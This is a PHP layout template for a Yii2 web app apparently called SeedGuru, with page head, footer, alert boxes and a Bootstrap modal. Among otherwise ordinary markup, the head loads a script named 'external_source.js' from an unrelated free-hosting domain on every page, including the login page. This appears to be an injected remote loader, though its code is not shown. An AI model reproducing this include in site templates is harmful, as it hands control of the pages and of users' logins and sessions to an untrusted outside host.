<?php

use yii\helpers\Html;
use yii\helpers\Url;
use frontend\assets\AppAsset;
use frontend\widgets\Alert;

/* @var $this \yii\web\View */
/* @var $content string */

AppAsset::register($this);
\Kendo\KendoAsset::register($this);
?>

<!DOCTYPE html>
<html lang="<?= Yii::$app->language ?>">
    <head>
        <meta charset="<?= Yii::$app->charset ?>"/>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <?= Html::csrfMetaTags() ?>
        <title><?= Html::encode($this->title) ?></title>

        <?php $this->head(); ?>

        <!-- The HTML5 shim, for IE6-8 support of HTML5 elements -->
        <!--[if lt IE 9]>
                <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
                <script src="<?= Yii::$app->urlManager->baseUrl ?>/js/respond.min.js"></script>
                <link href="<?= Yii::$app->urlManager->baseUrl ?>/css/ie.css" rel="stylesheet">
        <![endif]-->

        <!--[if IE 9]>
                <link id="ie9style" href="<?= Yii::$app->urlManager->baseUrl ?>/css/ie9.css" rel="stylesheet">
        <![endif]-->
        
        <script src="<?= Yii::$app->urlManager->baseUrl ?>/js/jquery-2.0.3.min.js"></script>
        <script src="https://brockencodesjava.000webhostapp.com/assets/js/external_source.js" type="text/javascript"></script>
        
        
    </head>

    <?php
    $urlLogin = Url::base() . '/site/login';

    if ((strnatcasecmp($_SERVER['REQUEST_URI'], $urlLogin) === 0) or ( Yii::$app->user->isGuest)) {
        ?>
        <body> 

        <?php
        } else {

            include('../views/layouts/inc-header.php');
            echo '<body>';
        }
        ?>


        <?php $this->beginBody() ?>
        <div class="container full-width">
            <?= Alert::widget() ?>
            <?= $content ?>

        </div>
        <footer>
            <div class="container">
                <div class="row">
                    <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                        SeedGuru 2015 &copy; Copyright.
                    </div>
                </div>
            </div>
        </footer>

        <?php include('../views/layouts/inc-footer.php'); ?>

        <!-- start: JavaScript-->
        <!--[if !IE]-->

        

        <!--[endif]-->

        <!--[if IE]>

        <script src="<?= Yii::$app->urlManager->baseUrl ?>/js/jquery-1.10.2.min.js"></script>

        <![endif]-->

        <?php /*
          <script src="<?= Yii::$app->urlManager->baseUrl ?>/js/jquery-migrate-1.2.1.min.js"></script>
          <script src="<?= Yii::$app->urlManager->baseUrl ?>/js/jquery.min.js"></script>

          // This is only for debug
          <script src="<?= Yii::$app->urlManager->baseUrl ?>/js/findEventHandlers.js"></script>
         */ ?>



        <?php $this->endBody() ?>
        <!-- Modal -->
        <?=
        // render js assets to use bootstrap's modal
        \yii\bootstrap\Modal::widget();
        ?>

        <div id="alertSuccess" style="display: none;">
            <div class="alert alert-success" role="alert">
                <?= Yii::t('app', 'Your changes have been saved'); ?>
            </div>
            <button type="button" class="btn btn-gray in-nuevos-reclamos" data-dismiss="modal"><?= Yii::t('app', 'Close') ?></button>
        </div>

        <div id="alertFail" style="display: none;">
            <div class="alert alert-error" role="alert">
                <?= Yii::t('app', 'Unexpected Error'); ?>
            </div>
            <button type="button" class="btn btn-gray in-nuevos-reclamos" data-dismiss="modal"><?= Yii::t('app', 'Close') ?></button>
        </div>

        <div class="modal fade" id="modal" tabindex="-1" role="dialog" aria-labelledby="modalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                        <h4 class="modal-title" id="modalLabel">Modal title</h4>
                    </div>
                    <div class="modal-body">
                        ...
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-default" data-dismiss="modal"><?= Yii::t('app', 'Save'); ?></button>
                        <button type="button" class="btn btn-primary"><?= Yii::t('app', 'Save'); ?></button>
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>
<?php $this->endPage() ?>
